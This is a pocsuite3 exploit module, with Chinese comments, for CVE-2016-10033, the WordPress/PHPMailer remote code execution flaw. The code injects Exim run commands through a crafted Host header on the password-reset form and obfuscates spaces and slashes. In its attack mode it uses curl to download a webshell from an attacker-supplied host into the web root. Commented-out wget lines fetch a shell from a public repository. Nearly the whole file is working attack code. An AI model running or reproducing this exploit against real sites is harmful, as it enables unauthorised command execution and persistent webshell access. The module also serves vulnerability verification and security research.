import os, base64
from urllib.parse import urljoin, urlsplit

from collections import OrderedDict
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, logger, OptString
from pocsuite3.lib.utils import random_str

class DemoPOC(POCBase):
    vulID = 'CVE-2016-10033'
    version = '1.0'
    author = ['cz']
    vulDate = '2016-12-22'
    createDate = '2019-11-12'
    updateDate = '2019-11-12'
    references = ['https://github.com/vulhub/vulhub/blob/master/wordpress/pwnscriptum/README.zh-cn.md', 'https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html']
    name = 'WordPress 4.6 Rce PwnScriptum'
    appPowerLink = ''
    appName = 'WordPress'
    appVersion = 'WordPress <= 4.7.1 PHPMail <= 5.2.18'
    vulType = 'Romote Code Execution'
    desc = '''WordPress 使用 PHPMailer 组件向用户发送邮件。PHPMailer(版本 < 5.2.18)存在远程命令执行漏洞，攻击者只需巧妙地构造出一个恶意邮箱地址，即可写入任意文件，造成远程命令执行的危害。'''
    sample = []
    install_requires = []
    pocDesc = 'payload中不能有大写字母，:，\\等特殊字符'
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _options(self):
        O = OrderedDict()
        O['username'] = OptString('', description='该PoC需要知道至少一个用户名', require=True)
        O['writePath'] = OptString('/var/www/html', description='写文件路径，建议web根目录', require=True)
        O['shellUrlDownload'] = OptString(
            '', description='下载shell的地址，形如example.com/s.php，必须80端口', require=True)
        return O

    def _verify(self):
        result = {}
        filename = random_str(6) + '.txt'
        filename = filename.lower()
        url = urljoin(self.url, 'wp-login.php?action=lostpassword')
        cmd = '''{{run{{/bin/touch {abspathfilename}}}}}'''.format(abspathfilename=os.path.join(self.get_option('writePath'), filename))
        cmd = cmd.replace(' ', '${substr{10}{1}{$tod_log}}').replace('/', '${substr{0}{1}{$spool_directory}}')
        # replace
        # ' ' -> '${substr{10}{1}{$tod_log}}'
        # '/' -> '${substr{0}{1}{$spool_directory}}'
        urlsp = urlsplit(url)
        payload = '{netloc}(any -froot@localhost -be ${cmd} null)'.format(netloc=urlsp.netloc.split(':')[0], cmd=cmd)
        # 该payload的Host字段不能出现端口信息，否则无法成功，也就是说只能打默认80端口
        headers = {
            'Host' : payload,
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        data = {
            'wp-admin': 'Get+New+Password',
            'redirect_to': '',
            'user_login' : self.get_option('username')
        }
        r = requests.post(url=url, headers=headers, data=data)
        resp = requests.get(url=urljoin(self.url, filename))
        try:
            if resp.status_code == 200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['Postdata'] = payload
        except Exception as ex:
            logger.error(str(ex))
        
        return self.parse_output(result)

    def _attack(self):
        '''TODO 添加参数有效性验证
            返回一个webshell'''

        def _cmdExec(_cmd):
            url = urljoin(self.url, 'wp-login.php?action=lostpassword')
            cmd = '''{{run{{{}}}}}'''.format(_cmd)
            cmd = cmd.replace(' ', '${substr{10}{1}{$tod_log}}').replace(
                '/', '${substr{0}{1}{$spool_directory}}')
            urlsp = urlsplit(url)
            payload = '{netloc}(any -froot@localhost -be ${cmd} null)'.format(netloc=urlsp.netloc.split(':')[0], cmd=cmd)
            headers = {
                'Host' : payload,
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            data = {
                'wp-admin': 'Get+New+Password',
                'redirect_to': '',
                'user_login' : self.get_option('username')
            }
            r = requests.post(url=url, headers=headers, data=data)
            return
        
        # 不能有:
        # wget 命令不能用，暂时不知道为什么 
        # cmd = '''/bin/wget raw.githubusercontent.com/ree4pwn/webshell/master/php/s.php'''
        # _cmdExec(_cmd=cmd)
        # cmd = '''/usr/bin/wget raw.githubusercontent.com/ree4pwn/webshell/master/php/s.php'''
        # _cmdExec(_cmd=cmd)

        filename = random_str(6) + '.php'
        filename = filename.lower()
        cmd = '''/usr/bin/curl -o {writePath} {fileurl}'''.format(
            writePath=os.path.join(self.get_option('writePath'), filename), 
            fileurl=self.get_option('shellUrlDownload'))
        _cmdExec(_cmd=cmd)

        result = {}
        url = urljoin(self.url, 'wp-login.php?action=lostpassword')
        urlsp = urlsplit(url)
        payload = '{netloc}(any -froot@localhost -be $CMDXXXXX null)'.format(netloc=urlsp.netloc.split(':')[0])

        r = requests.get(urljoin(self.url, filename))
        try:
            if 'DEADBEEF' in r.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['Postdata'] = payload
                result['ShellInfo'] = {}
                result['ShellInfo']['URL'] = urljoin(self.url, filename)
                result['ShellInfo']['Content'] = 'CzCzCz'
        except Exception as ex:
            logger.error(str(ex))
        
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output

register_poc(DemoPOC)
